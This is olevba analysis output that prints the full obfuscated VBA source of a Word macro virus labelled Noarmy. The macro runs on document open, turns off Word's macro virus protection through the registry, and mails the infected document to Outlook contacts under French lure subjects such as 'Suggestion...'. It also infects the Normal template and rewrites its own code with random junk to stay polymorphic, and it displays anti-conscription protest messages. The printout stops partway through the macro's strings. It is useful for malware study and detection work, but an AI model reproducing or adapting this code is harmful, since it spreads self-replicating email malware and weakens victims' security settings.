olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Noarmy-74d672e489d3db1eca10baec4a08e89fc4a5574e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NOSN.cls 
in file: Virus.MSWord.Noarmy-74d672e489d3db1eca10baec4a08e89fc4a5574e - OLE stream: 'Macros/VBA/NOSN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim h7, g8, j1, k2, j8, l1, m5, l8, a5, d3, g6, h3, k1, k5, g3, n6, h5, j5, k7 ' eeapqtnunfiiirm
Dim e8, b9, a7, d6, c5, e2, g1, l3, l9, n2, m1, h8, l5, i1, i7, e4, c7, c4, f3, h1, d8: Dim g5, e1, m4, b3, d4, f7, i3, g2, e5, d2, a4, a3, a2, c2, d1, c3, c1, b2, b1, _
a1: Private Sub Document_Open() ' khcvvfczglesnuy
On Error _
Resume Next: Call f1 ' agjnqvmxnp
Call f2: Randomize: Select Case System.PrivateProfileString(j1, k2, _
j8): Case Is <> j1 ' fsnpmnojtkde
System.PrivateProfileString(j1, k2, _
j8) = 1&: Case Else ' hzezvcvbr
Options.ConfirmConversions = m5 ' inozwt
Options.VirusProtection = m5 ' chlwjzjpvt
Options.SaveNormalPrompt = m5 ' kjkvtgbbsv
End Select ' quzwrggrw
d8 = a5 ' xkey
Set c4 = CreateObject(d8): Set f3 = c4.GetNameSpace(l8) ' tiwufjtpmqea
Select Case System.PrivateProfileString(j1, d3, g6) ' ihfze
Case Is <> _
h3: Select Case c4: Case k1: f3.Logon k5, g3 ' dpeorgjrim
For i = 1 To f3.AddressLists.Count: Set g4 = f3.AddressLists(i) ' cjvmgwosofbsdag
Set h1 = c4.CreateItem(m5) ' huvprjyy
h2 = g4.AddressEntries.Count ' fchyftqgp
b6 = _
m5: For j = 1 To h2 ' sqiyeouyd
Set j2 = g4.AddressEntries(j) ' jkystnunoqb
Select Case Len(j2.Address) ' fype
Case Is > 4: Select Case InStr(Len(j2.Address) - 3, j2.Address, n6, vbTextCompare) ' xarfaphnym
Case Is <> 0 ' eglydimcrqvn
h1.Recipients.Add j2: b6 = b6 + _
1: End Select: End Select: Select Case b6: Case 50 ' nrruu
Exit For: End Select: Next j: Select Case Rnd(): Case Is < 0.33: h1.Subject = h5: h1.Body = j5: Case Is < 0.66 ' eayhqechm
h1.Subject = g1 ' fhzx
h1.Body = l3 ' kwndlfij
Case Else: h1.Subject = l9: h1.Body = n2 ' lmfzowyigbzqbrn
End Select ' xcrgvosgsjxtep
h1.Attachments.Add ActiveDocument.FullName ' yxhpviaqfwpjwr
h1.Send: Next i ' nozrrrfojoqhj
f3.Logoff: End Select: System.PrivateProfileString(j1, d3, g6) = h3 ' vnnprmadoxajz
End Select ' tqirawxkslp
Set n1 = ActiveDocument.VBProject: Set i6 = n1.VBComponents.Item(1) ' etlyulgaywqk
Set n1 = NormalTemplate.VBProject ' pyztgszap
Set k3 = n1.VBComponents.Item(1): i2 = False: Select Case InStr(1, ActiveDocument.Name, m1) ' lgkbuuzw
Case False: Select Case i6.Name ' achf
Case Is <> g6 ' xvdyprz
Set b5 = k3: Set f5 = i6: i2 = True ' pwzzkplvgxfq
End Select: End Select ' svnciwfcmiie
Select Case k3.Name ' rwtpkcabmqmphi
Case Is <> g6: Set b5 = i6 ' eqdtlzxkx
Set f5 = k3 ' ehvqipoqwrq
i2 = True ' sdqxfijxlxy
End Select ' cpqgyb
Select Case i2: Case _
True: i4 = b5.CodeModule.CountOfLines - 1 ' xxjtyaqjxwcdij
c8 = f5.CodeModule.CountOfLines: Select Case c8 ' wzekiaashrw
Case Is > 0: f5.CodeModule.DeleteLines 1, c8 ' pqvyqnigiwm
End Select ' fbfbxqrh
c6 = 1: c9 = "" ' vntlr
j3 = "": a6 = 0 ' zxanc
For l2 = 1 To i4: h4 = b5.CodeModule.Lines(l2, 1): i = 1: f4 = InStr(1, h4, Chr(39)): Select Case _
f4: Case 0 ' eryufkezrmvo
f4 = Len(h4): Case Else: f4 = f4 _
- 2: End Select: Do ' zzda
j = InStr(i, h4, Chr(32)) ' sapmjufwsoxes
Select Case j ' hsml
Case 0 ' msvdsjfhuu
j = Len(h4) + 1 ' oimsjfjxony
b8 = True ' bglsjijn
Case f4 + 1: b8 = True: Case Else ' vmhoafljxaz
b8 = False: End Select ' nqituorqpayvzce
n5 = Mid(h4, i, j _
- i): Select Case b8: Case True ' sswdrvcfkywu
f6 = b5.CodeModule.Lines(l2 + 1, 1) ' zecqkjklxgv
k4 = InStr(1, f6, Chr(32)) ' pbgg
Select Case k4: Case 0: j3 = "": Case _
Else: j3 = Mid(f6, 1, k4 - 1): End Select: End Select: Select Case n5: Case k7 + Chr(58): n5 = e8 + Chr(58): Case e8 + Chr(58): n5 = k7 + Chr(58): Case k7: n5 = e8: Case e8 ' awlczactcluaooa
n5 = k7: End Select ' ycnuuex
Select Case h6: Case False ' wkaa
Select Case Rnd() ' drgpklokeemd
Case Is < 0.02 ' ryqzzh
h6 = _
True: Case Else: h6 = False: Select _
Case b8 ' zoerynb
Case True: Select Case l2 ' ycpxncimmhdnl
Case i4: h6 = True ' jgafbojnexdyyz
End Select: Select Case Rnd(): Case Is < 0.5: h6 = True: End Select ' vboo
Select Case j3: Case e4 ' ayrvh
h6 = True: a6 = a6 + 1: Select _
Case a6 ' zcjjvendhxetyre
Case 4 ' ixhwjwhpitnhy
l2 = i4 ' drpqqcpch
End Select: End Select ' jjbbfwqepw
Select Case InStr(1, _
h4, c7) ' gveuheecw
Case Is <> 0 ' tpxzin
Select Case n5 ' myzodufrlcybx
Case j17: h6 = False: Case Else: h6 = _
True: End Select ' mrgerymth
End Select ' ysved
End Select: End Select: Select Case Len(n5): Case Is _
<> 0: Select _
Case InStr(Len(n5), n5, Chr(58)): Case Is <> 0 ' fgzpoxcfhigqly
Select Case Rnd(): Case Is < 0.5: h6 = True ' kjhgkepgzb
End Select: End Select ' rmgebxneyw
End Select: Case Else ' rwvjsdgsxdt
h6 = False: End Select ' gdokdyqtqihq
Select Case b8: Case True: Select Case n5 ' ukby
Case Chr(95): c9 = c9 + Switch(h6 = True, Chr(95), h6 = False, j1) ' rdexpq
j4 = False ' mcckidr
Case Else ' ytbefrlwvd
c9 = c9 + Switch(h6 = True, n5, h6 = False, n5 + Chr(58) + Chr(32)) ' qoxzdqppjur
j4 = True ' retckbeqeoo
End Select: Case Else ' iehitpajgvm
Select Case InStr(Len(n5), n5, Chr(58)): Case 0 ' rjcyaxz
c9 = c9 + Switch(h6 = True, n5 + Chr(32) + Chr(95), h6 = False, n5 + Chr(32)): j4 = False ' gvhebffu
Case Else ' uoemz
c9 = c9 + Switch(h6 = True, Mid(n5, _
1, Len(n5) - 1), h6 = False, n5 + Chr(32)) ' sdhcpensa
j4 = True: End Select: End Select ' svjhkgxikyd
Select Case h6: Case True: Select Case j4 ' mpqelkondc
Case True: c9 = c9 + Chr(32) + Chr(39) + Chr(32) ' uhvkstcazyrct
e6 = Int((12 * Rnd) + 4) ' rzoua
For d5 = 1 To e6: c9 = c9 + Chr$(Int((26 * Rnd) + 97)) ' glet
Next d5: End Select ' zmesrwdxilpxgg
f5.CodeModule.InsertLines c6, _
c9: c6 = c6 + 1: c9 = "" ' svqqe
End Select: i = j + 1 ' jxutosmum
Select Case b8: Case True: Exit Do ' jxutkcsqspmaxg
End Select ' vmfjissqjidu
Loop: Next l2: Select Case k3.Name ' wcnezxzg
Case Is <> g6 ' mmoqd
f5.Name = g6: NormalTemplate.Save: End Select: Select Case i6.Name ' cvennaqistqtmm
Case Is <> g6 ' rzdsic
f5.Name = g6: ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True ' oikmaeqwwulp
End Select ' jpewvraki
Case Else: Select Case InStr(1, ActiveDocument.Name, m1) ' hneqbnjakk
Case _
False: Select Case Rnd() ' apswdjgu
Case Is < 0.015 ' iplgkxh
MsgBox h8 + l5 + i1 + i7, 32 ' wwie
MsgBox g5 + e1 + m4 + b3 + d4 + f7, 16: MsgBox i3 + g2 + e5 + d2 + a4, 16: MsgBox a3 + a2 + c2 + d1 + c3, 16 ' jwksecipzpbsz
MsgBox c1 + b2, 16: MsgBox b1 + a1, 48 ' wnqeobmmbgxmrud
Case Is < 0.03 ' yhigyiq
Selection.TypeText b9 ' krakwqjvik
Case Is < 0.045 ' yaxhrr
Selection.TypeText a7 ' cyrkmoacfdcuy
Case Is < 0.06: Selection.TypeText d6 ' pouehboesy
Case Is < 0.075: Selection.TypeText c5 ' nqapsjdpddtcu
Case Is < 0.09 ' alvfyepgzuuyo
Selection.TypeText e2 ' pqqpl
End Select ' gixee
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ' gobqiaweguf
ActiveDocument.Saved = True ' evvjslwydxhb
End Select: End Select ' fykwupxk
End Sub ' fywhexnrzrcre
Private Sub f1(): h7 = Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111): g8 = Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(46) + Chr(46) + Chr(46) ' hvfdv
j1 = _
"": k2 = Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) ' vkdkgcg
k2 = k2 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) _
+ Chr(82) + Chr(92) _
+ Chr(83) + _
Chr(111) + _
Chr(102): k2 _
= k2 _
+ Chr(116) + Chr(119) _
+ Chr(97) + _
Chr(114) + Chr(101) + Chr(92) + Chr(77) _
+ Chr(105) + Chr(99) + Chr(114) ' gmcdheybfnrtbo
k2 = k2 + Chr(111) + Chr(115) + _
Chr(111) + Chr(102) + Chr(116) + Chr(92) + _
Chr(79) + Chr(102) + Chr(102) + Chr(105): k2 = k2 + Chr(99) + _
Chr(101) + _
Chr(92) + Chr(57) + Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) ' lrxtagkscqt
k2 = k2 + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + _
Chr(114) + Chr(105) + Chr(116) + Chr(121): j8 = Chr(76) + Chr(101) + Chr(118) + Chr(101) + Chr(108): l1 = Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115) ' qhikxxjscmmdrd
m5 = 0: l8 = Chr(77) + Chr(65) + Chr(80) + Chr(73) ' wdvpcrwrjrnub
a5 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + _
Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112): a5 = a5 + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110): d3 = Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) ' ztymf
d3 = d3 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) ' xfyuknxo
d3 = d3 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114): d3 = d3 _
+ Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) _
+ Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) ' jqaswqtr
d3 = d3 + Chr(99) + Chr(101) + Chr(92): g6 = Chr(78) + Chr(79) + Chr(83) + Chr(78) ' vwlzcku
h3 = "Non" + Chr(32) + "au" + Chr(32) + "Service" + _
Chr(32) + "National" + _
Chr(32) _
+ "-" + Chr(32) + "Oui" + Chr(32): h3 = h3 + "au" + Chr(32) + "Contrat" _
+ Chr(32) + "de" + Chr(32) + "Travail": k1 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107): k5 = Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) _
+ Chr(108) + Chr(101): g3 = Chr(112) + Chr(97) + Chr(115) + Chr(115) + _
Chr(119) + Chr(111) + Chr(114) + Chr(100): n6 = Chr(46) + Chr(102) + Chr(114) ' lsdvocvlaeqgjh
h5 = "Suggestion..." ' lyhvu
j5 = "Ce" + Chr(32) + "document" + Chr(32) + "(" + ActiveDocument.Name + ")" _
+ Chr(32) + "vaut" + Chr(32) + "bien": j5 = j5 + Chr(32) + "un" + Chr(32) + "petit" + Chr(32) + "coup" + Chr(32) + "d" _
+ Chr(39) + "oeil." + Chr(13) + "J" + Chr(39) + "aimerais": j5 = j5 + Chr(32) + "savoir" + Chr(32) + "s" + Chr(39) _
+ "il" + Chr(32) + "correspond" + Chr(32) + "à" _
+ Chr(32) + "ce" + Chr(32): j5 = j5 + "qu" + Chr(39) + "on" + Chr(32) + "attends" + Chr(32) _
+ "de" + Chr(32) + "lui." + Chr(13): k7 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) ' huskuhih
k7 = k7 + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) ' emqeybl
e8 _
= Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) ' toead
e8 = _
e8 + Chr(95) _
+ Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41) ' krpppuhqehjxf
b9 = Chr(32) + "http://sn.agat.net" + Chr(32): a7 = Chr(32) + "http://altern.org/gigm/service.htm" + Chr(32) ' hlgudqzbgp
d6 = Chr(32) + _
"http://www.donquichotte.com" + Chr(32) ' dsweqck
c5 = Chr(32) + "http://www.multimania.com/antisn" + Chr(32) ' todkcir
e2 = Chr(32) + "Oui" + Chr(32) + "à" _
+ Chr(32) + "l" + Chr(39) + "Emploi," + Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "armée" + Chr(32): e2 = e2 + "de" + Chr(32) + "métier," + Chr(32) + "mais" + Chr(32) + "Non" + Chr(32) + "au" + Chr(32) + "service" ' blauyjwotsoqmt
e2 = e2 + Chr(32) + _
"national" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + _
"de" + Chr(32) + "travail," + Chr(32) ' ibgdimgw
e2 = e2 + "Non" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "absurdité." + Chr(32) ' zgatkez
g1 = "Un" + Chr(32) + "peu" + Chr(32) + "d" + Chr(39) + "aide..." ' amkdzflnvd
l3 = "Je" + Chr(32) + "dois" + _
Chr(32) + "avouer" + Chr(32) + "que" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) + _
"un" + Chr(32) + "peu" ' wegqemdtw
l3 = l3 + Chr(32) + "de" + Chr(32) + "mal" + Chr(32) + "à" + Chr(32) + "peaufiner" + Chr(32) + "ce" + Chr(32) + "document": l3 = _
l3 + Chr(32) + "(" + ActiveDocument.Name + ")." + _
Chr(13) + "Merci" + Chr(32) + "de" + Chr(32) + "m" + Chr(39) + "aider" + Chr(32): l3 = l3 + "un" + Chr(32) + "peu" + Chr(32) + "pour" + Chr(32) + "l" + _
Chr(39) + "améliorer..." + Chr(13) ' ntruveqquddb
l9 = "Version" + Chr(32) + "finale": n2 = "Voici" + Chr(32) + "la" + Chr(32) + "dernière" + Chr(32) + "version" + Chr(32) + "de" + Chr(32) + "ce" + Chr(32): n2 = n2 + "sur" + Chr(32) _
+ "quoi" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) + "travaillé" + Chr(32) + "ces" + Chr(32) + "derniers": n2 = n2 _
+ Chr(32) + "temps" + Chr(32) + "(" + ActiveDocument.Name + ")." + Chr(13) + "Tous" + Chr(32) + "les" + Chr(32): n2 = n2 + "avis" + Chr(32) + "sont" + Chr(32) + "la" + Chr(32) + _
"bienvenue" + Chr(32) + "!" + Chr(13) ' iomzhlotzlrit
m1 = "Document" ' zrzimixcqohfu
h8 = "Le" + Chr(32) + "mystère" + Chr(32) _
+ "du" + Chr(32) + "jour" + Chr(32) + "à" + Chr(32) + "résoudre" + Chr(32) + "est" + Chr(32) ' zdxfdxeypuyvvuf
h8 = h8 + _
"le" + _
Chr(32) + "suivant:" + Chr(13) + Chr(13): End Sub ' etqo
Private Sub f2(): l5 = "Lors" + Chr(32) + "de" + Chr(32) _
+ "son" + Chr(32) + "intervention" + Chr(32) + "télévisée" + Chr(32) + "du" + Chr(32) + "22" + Chr(32) ' nphjkmdfvtg
l5 = l5 + "février" + Chr(32) + "1996," + Chr(32) + "Jacques" + Chr(32) + "Chirac," + Chr(32) + "Président" + Chr(32) + "de" + Chr(32) + "la" ' deprmo
l5 = l5 + Chr(32) + "République" + Chr(32) + "et" + Chr(32) + "Chef" + Chr(32) + "des" + Chr(32) + "Armées," + Chr(32) + "a" + Chr(32) + "proclamé:" + Chr(32): i1 = """Nous" + Chr(32) + "n" + Chr(39) + "avons" + Chr(32) + "plus" + Chr(32) + "besoin" + Chr(32) + "d" + Chr(39) + "appelés..." + Chr(32) + "(Le" + Chr(32) _
+ "service" + Chr(32): i1 = i1 + "national)" + Chr(32) + "est" + Chr(32) + "devenu" + Chr(32) + _
"inégal" + Chr(32) + "et" + Chr(32) + _
"il" + Chr(32) + "n" + _
Chr(39) + "est" + _
Chr(32) + "plus": i1 = i1 + Chr(32) + "universel.""" + Chr(32) + _
"Le" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "a" + Chr(32) + "ensuite" + Chr(32) + "été": i1 = i1 + Chr(32) + "supprimé" + Chr(32) + "pour" _
+ Chr(32) + "tous..." + Chr(32) + "ou" + _
Chr(32) + "presque:" + Chr(32): i7 = "Alors" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus" + Chr(32) + "obligatoire" + Chr(32) + "pour" + Chr(32) + _
"les" + Chr(32) + "gens": i7 = i7 + Chr(32) + "nés" + _
Chr(32) + "après" + Chr(32) + "1979," + Chr(32) + "les" + Chr(32) + "gens" + Chr(32) + "nés" + Chr(32) + "avant" + Chr(32) ' epmebtdbbeussl
i7 = i7 + "1979" + Chr(32) + "peuvent" + Chr(32) + "encore" + Chr(32) + "perdre" + Chr(32) + "emploi," + Chr(32) + "appartement," + Chr(32) + "vie" + Chr(32) ' irkyld
i7 = i7 + "de" + Chr(32) + "famille" + Chr(32) + "sur" + Chr(32) + "simple" + Chr(32) + "ordre" + Chr(32) + "du" + Chr(32) + "Service" + Chr(32) + "National." ' thtxrzuu
g5 = "En" + Chr(32) + "réalité," + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "actuelle" + Chr(32) + "est" + Chr(32) + "bien" + Chr(32) _
+ "pire" + Chr(32) ' vfzw
g5 = g5 + "encore:" + Chr(32) + "Après" + Chr(32) + "avoir" + Chr(32) + "accordé" + Chr(32) + "un" + Chr(32) + "report" + Chr(32) + "d" + Chr(39) + "incorporation" + _
Chr(32): g5 = g5 + "de" + Chr(32) + "2" + Chr(32) + "ans" + Chr(32) + "aux" + Chr(32) ' jqezvj
e1 = "jeunes" + Chr(32) + _
"ayant" + Chr(32) + "obtenu" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) _
+ "Travail," + Chr(32) + "l" + Chr(39) + "Armée" + _
Chr(32) + "a" + Chr(32): e1 = e1 + "l" + Chr(39) + "intention" + Chr(32) + "de" + Chr(32) + "les" + Chr(32) + "rappeler" + Chr(32) + "au" + Chr(32) + "beau" + Chr(32) + "milieu" + Chr(32) + "de" + Chr(32): e1 _
= e1 + _
"leur" + Chr(32) + "carrière" + Chr(32) + "professionnelle." + Chr(32) + "Les" + Chr(32) + "implications" + Chr(32) + "sont" _
+ Chr(32) + "bien" + Chr(32) ' ovvwdgo
e1 = e1 _
+ "sûr" + Chr(32) + "catastrophiques:" + Chr(13) + Chr(13): m4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Vivre" _
+ Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + _
Chr(32) + "ne": m4 = m4 + Chr(32) + "permet" + Chr(32) + "pas" + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "engagements," + Chr(32) + "dettes" + Chr(32) + "et" + Chr(32): b3 = "impôts" + Chr(32) + "qui" + Chr(32) + "sont" + Chr(32) + "déjà" + Chr(32) + "difficiles" + _
Chr(32) + "à" + Chr(32) + "assumer" + Chr(32) + "dans" + Chr(32) + "un" ' eley
b3 = _
b3 + Chr(32) + "début" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "active" + Chr(32) + "normal." + Chr(13) + Chr(13) ' njeoagj
d4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Ne" + Chr(32) + "pas" + Chr(32) + _
"pratiquer" + Chr(32) + "son" + Chr(32) + "activité" + Chr(32) + "professionnelle" + Chr(32): d4 = d4 + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "implique" + Chr(32) + "également" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) _
+ "d" + Chr(39) + "expérience": d4 = d4 + Chr(32) + "utile," + Chr(32) + _
"la" + Chr(32) + "nécessité" + Chr(32) + "d" + Chr(39) + "une" + Chr(32) + "période" + Chr(32) ' gushnmlvzdn
f7 = "de" + Chr(32) + "réadaptation," + Chr(32) + "une" + Chr(32) + "modification" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "projet" + Chr(32) + _
"professionnel": f7 = f7 + Chr(32) + "et" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "l" + Chr(39) _
+ "inquantifiable" + Chr(32) _
+ "colère" + Chr(32) + "des" + Chr(32) + "employeurs," + Chr(32) ' hwfwupuzaa
f7 = f7 + "qui" + Chr(32) + "se" + Chr(32) + "traduira," + Chr(32) + "intentionnellement" _
+ Chr(32) + "ou" + Chr(32) + "non," _
+ Chr(32) + "par" + Chr(32) + "un" + Chr(32): f7 = f7 + "ralentissement" + Chr(32) + "dans" + Chr(32) + "l" + Chr(39) + "évolution" + Chr(32) + "de" + Chr(32) + "carrière." ' uhwmfbpjmzdy
i3 = Chr(32) + Chr(32) + "-" + Chr(32) + "Du" _
+ Chr(32) + "fait" + Chr(32) + "qu" + _
Chr(39) + "il" + Chr(32) + "soit" + _
Chr(32) + "tout" + Chr(32) + "bonnement" + _
Chr(32) + "impossible" ' wzfxxizmaxq
i3 = i3 + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "loyer" + Chr(32) + "sans" + Chr(32) + "salaire" + _
Chr(32) + "sur" + Chr(32): i3 = i3 _
+ "cette" + Chr(32) + "période," + Chr(32): g2 = "l" _
+ Chr(39) + "abandon" + Chr(32) + "du" + Chr(32) + "logement" + _
Chr(32) + "est" + Chr(32) + "irrémédiable." + Chr(32) + "Qui" + Chr(32) + "prendra" + Chr(32) + "alors" + Chr(32): g2 = g2 + "en" + Chr(32) + "charge" + Chr(32) + "les" + Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "déménagement," + Chr(32) + "de" + Chr(32) + "garde-meuble" + Chr(32) ' hjstsctjuevlwkc
g2 = g2 + "et" + Chr(32) + "de" + Chr(32) + "recherche" + Chr(32) + "d" + Chr(39) + "un" + Chr(32) + "nouvel" + Chr(32) + "appartement?" _
+ Chr(13) + Chr(13) ' tvuut
e5 = Chr(32) + Chr(32) + "-" + Chr(32) + "Et" + Chr(32) + "que" + Chr(32) + "dire" + Chr(32) + "de" + Chr(32) + "la" + Chr(32) + "situation" _
+ Chr(32) + "morale" + _
Chr(32): e5 = e5 + "au" + Chr(32) + "plus" + Chr(32) + "bas" + Chr(32) + "durant" _
+ Chr(32) + "ces" + Chr(32) + "10" + Chr(32) + "longs" + Chr(32) + "mois" + Chr(32) + "?" + Chr(32) ' cgflwy
e5 = e5 + "Le" + Chr(32) + "rêve" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "que" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "était" + Chr(32) + _
"entrain" + Chr(32) + "de" + Chr(32) ' ppztuefh
e5 = e5 + "bâtir" + Chr(32) + "s" + Chr(39) + "effondre" + Chr(32) + "pour" + Chr(32) + "laisser" + Chr(32) + "place": d2 = Chr(32) + "aux" + Chr(32) + "corvées" + Chr(32) + "inutiles" + Chr(32) + "et" _
+ Chr(32) + "a" + Chr(32) + "l" + Chr(39) + "ennui" + Chr(32) + "bien" + Chr(32) + "connu" + Chr(32) + "du": d2 = d2 + Chr(32) + "Service" + Chr(32) + "National." + Chr(32) + "Est-il" + Chr(32) + "possible" + Chr(32) + "de" + _
Chr(32) + "rester" + Chr(32) _
+ "loin" + Chr(32) + "de": a4 = a4 + Chr(32) + "la" + Chr(32) + "personne" + Chr(32) _
+ "avec" + Chr(32) + "qui" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "vie," + Chr(32) + "de" + Chr(32) _
+ "ses" + Chr(32) + "relations," + Chr(32) + "de": a4 = Chr(32) + "ses" + Chr(32) + "amis," + Chr(32) + "pendant" + Chr(32) + "10" + _
Chr(32) + "mois" + Chr(32) + "puis" + Chr(32) + "de" + Chr(32) + "reprendre" + Chr(32) + "comme" + Chr(32) + _
"si": a4 = a4 + Chr(32) + "rien" + Chr(32) + _
"ne" + Chr(32) + "s" + _
Chr(39) + "était" + Chr(32) + "passé" + Chr(32) + "?" ' xhqxlcgl
a3 = "Certains" + _
Chr(32) + "diront" + Chr(32) + "que" + Chr(32) _
+ "le" + Chr(32) + "Service" _
+ Chr(32) + "National" + Chr(32) + "fait" + Chr(32) + _
"partie" + Chr(32) + "du" + Chr(32) + "devoir": a3 = a3 + Chr(32) + "de" + Chr(32) + "citoyen." + Chr(32) + "Mais" + Chr(32) + "servir" + Chr(32) + "son" + Chr(32) + _
"pays" + Chr(32) + "c" + Chr(39) + "est" + Chr(32) + "d" + Chr(39) + _
"abord" + Chr(32) _
+ "payer" + Chr(32): a3 = a3 + "ses" + Chr(32) + "impôts," + Chr(32) + "participer" + Chr(32) + "aux" + Chr(32) + "frais" + Chr(32) _
+ "de" + Chr(32) + "la" + Chr(32) + "sécurité" + Chr(32) + "sociale," + Chr(32) + "des" ' hprrwwepxkyn
a3 = a3 + Chr(32) + "allocations" + Chr(32) + "chômage,": a2 = Chr(32) + "des" + Chr(32) + "retraites," + Chr(32) + "etc." + Chr(32) + "Ce" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "les" + Chr(32) + "personnes" + Chr(32) + _
"qui": a2 = a2 + Chr(32) + "travaillent" + Chr(32) + "qui" + Chr(32) + "payent" + Chr(32) + "tout" + Chr(32) + "cela," + Chr(32) + "et" + Chr(32) + "les" + Chr(32) + "actuels" + Chr(32) + "sursitaires": a2 = a2 + Chr(32) + "en" + Chr(32) + "font" + Chr(32) + "partie." + _
Chr(32) + "Ils" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32) + "plus" + Chr(32) + "utiles" + Chr(32): c2 = "à" + Chr(32) + "la" + Chr(32) + "nation" + Chr(32) + "en" + Chr(32) + "tant" + Chr(32) + "que" + Chr(32) + "cotisants" + Chr(32) + "qu" + Chr(39) + "en" + _
Chr(32) + "tant" + Chr(32) + "qu" + Chr(39) + "appelés" + Chr(32) ' lyjyiskcgeltg
c2 = c2 + "du" + Chr(32) + "contingent." + Chr(13) + Chr(13) ' hifrnxx
d1 = "Le" + Chr(32) + "service" + Chr(32) + "national" + Chr(32) + "prétends" + Chr(32) + "aujourd" + Chr(39) + "hui" + Chr(32) + "que" + Chr(32) + "la" + Chr(32) + "vie" + Chr(32) + "reprends" + Chr(32) + "son" ' ggknpklwet
d1 = d1 + Chr(32) + "cour" + Chr(32) + "normalement" + Chr(32) + "après" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "service" + Chr(32) + "au" _
+ Chr(32) + "milieu" + Chr(32) ' mapqvzbhttl
d1 = d1 + "d" + Chr(39) + "un" + Chr(32) + "Contrat" + _
Chr(32) + "de" + Chr(32) + "Travail." + Chr(32) + "C" + Chr(39) + "est" + Chr(32) + "bien" + Chr(32) + _
"sûr" + Chr(32) + "un" + Chr(32) + "véritable" + Chr(32) _
+ "utopisme" ' avsmkmu
d1 = d1 + Chr(32) + "et" + Chr(32) + "le" + Chr(32) ' nduuowkykrf
c3 = "bilan" + Chr(32) + "ne" + Chr(32) + "se" + Chr(32) + "résume" + Chr(32) + "pas" + Chr(32) + _
"à" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "de" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32): c3 = c3 + "de" + Chr(32) + "temps:" + Chr(32) + "C" + Chr(39) + "est" + _
Chr(32) + "une" + Chr(32) + _
"véritable" + Chr(32) + _
"catastrophe" + Chr(32) + "pour" + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "financière,": c3 = c3 + Chr(32) + "matérielle" + Chr(32) + "et" + Chr(32) + "morale" + Chr(32) + "de" + Chr(32) + "l" + Chr(39) + "individu," + _
Chr(32) + "qui" + Chr(32) + "aura" + Chr(32) + "des" + Chr(32) + "répercutions" + Chr(32) ' rfjyvimm
c3 = c3 + "regrettables" + Chr(32) + "et" + Chr(32) + "durables." ' wcswircltcbd
c1 = "Ils" + Chr(32) + "sont" + Chr(32) + "environ" + Chr(32) + _
"250" + Chr(32) + "000" + Chr(32) + _
